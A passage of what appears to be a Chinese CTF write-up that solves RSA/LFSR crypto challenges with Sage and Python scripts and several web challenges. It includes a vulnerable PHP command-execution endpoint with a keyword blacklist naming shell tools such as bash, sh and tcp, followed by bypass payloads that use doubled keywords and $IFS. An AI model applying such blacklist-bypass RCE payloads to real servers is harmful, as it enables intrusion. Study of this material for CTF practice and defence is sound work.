class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi_)</span><br><span class="line">        m = <span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:]</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;f-4ae0-b369-&#x27; </span></span><br></pre></td></tr></table></figure><p>Part3，共私钥指数 $d$ 攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">nl=[...]</span><br><span class="line">el=[...]</span><br><span class="line">cl=[...]</span><br><span class="line">ind=[]</span><br><span class="line">nl_s=<span class="built_in">sorted</span>(nl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ind.append(nl.index(nl_s[i]))</span><br><span class="line"><span class="built_in">print</span>(ind)</span><br><span class="line">e=[]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    e.append(el[ind[i]])</span><br><span class="line">    n.append(nl[ind[i]])</span><br><span class="line">    c.append(cl[ind[i]])</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">6</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">a[<span class="number">0</span>]=[M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>],e[<span class="number">5</span>],e[<span class="number">6</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">6</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">5</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">7</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">6</span>],<span class="built_in">int</span>(d),<span class="built_in">int</span>(n[<span class="number">6</span>])))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;5a3d94a20a2c&#x27;</span></span><br></pre></td></tr></table></figure><p>连接得flag：flag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c}</p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????&#x27;</span></span><br><span class="line"></span><br><span class="line">z=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=sympy.nextprime(z)</span><br><span class="line">q=sympy.prevprime(<span class="number">10</span>*z)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">e=<span class="number">0xe18e</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n= ...</span></span><br><span class="line"><span class="comment">#c= ...</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解RSA，发现 $\gcd(e,\varphi(n))=2$，令 $e’=\frac{e}{2},m’=m^2$，</p><p>先求出 $m’$，再利用Rabin算法求 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0xe18e</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(n//<span class="number">10</span>,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">m = rabin_decrypt(mm,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="BABY-RSA"><a href="#BABY-RSA" class="headerlink" title="BABY-RSA"></a>BABY-RSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">c = <span class="built_in">pow</span>(num, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(hp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">str</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= ...</span></span><br><span class="line"><span class="string">c= ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key:</span></span><br><span class="line"><span class="stringspan></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA $p$ 高位泄露攻击+LFSR。</p><p>先用LFSR结果异或还原 $p$ 高位 $hp$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#xx27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">hp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">hp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">int</span>(hp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(hp)</span><br><span class="line"><span class="comment"># 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br></pre></td></tr></table></figure><p>此时 $hp$ 有568位，根据Coppersmith定理，1024位的 $p$ 至少需要高576位才能恢复完整 $p$，需爆破8位二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">hp = <span class="number">484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.digits + <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        pp = <span class="built_in">hex</span>(hp) + a + b</span><br><span class="line">        <span class="comment">#p需要用0补全到1024位</span></span><br><span class="line">        pp += <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">        <span class="comment">#要加的数字与补全p时0的个数有关</span></span><br><span class="line">        pp = <span class="built_in">int</span>(pp, <span class="number">16</span>)</span><br><span class="line">        p_fake = pp+<span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">        pbits = <span class="number">1024</span></span><br><span class="line">        kbits = pbits-<span class="number">576</span></span><br><span class="line">        pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line">        <span class="comment">#print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))</span></span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        f = x + pbar</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">            <span class="built_in">print</span>(x0 + pbar)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span>        </span><br><span class="line"><span class="comment"># 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br></pre></td></tr></table></figure><p>最后常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">c = <span class="number">3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>查看源码，找到 <code>main.js</code>，发现 <code>ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==</code>，base64解码得flag。</p><p>​    </p><h3 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h3><p>提示robots协议，访问 <code>robots.txt</code>，发现存在 <code>fiag_ls_h3re.php</code>，</p><p>访问发现右键被禁用，加前缀 <code>view-source:</code> 查看源码得flag。</p><p>​    </p><h3 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;ob_start&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;getenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;error_log&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;nl&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;tac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    exec(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>带黑名单的无回显RCE，可以重定向写命令执行结果到文件，关键字可双写绕过，空格用<code>$IFS</code>绕过。</p><p>列目录：<code>?cmd=llss$IFS/&gt;1.txt</code>，得到根目录flag文件名 <code>ctf_is_fun_flag2021</code>；</p><p>读文件：<code>?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt</code>，得到flag。</p><p>​    </p><h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><p>源码里有python和go两个文件夹，有两个服务，端口8000是python开的，映射到对外端口；内网端口5000是go服务。python代码相当于中转站接受外网请求，处理后转发给go，go进行底层处理。</p><p>go服务中关键代码 <code>backend.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 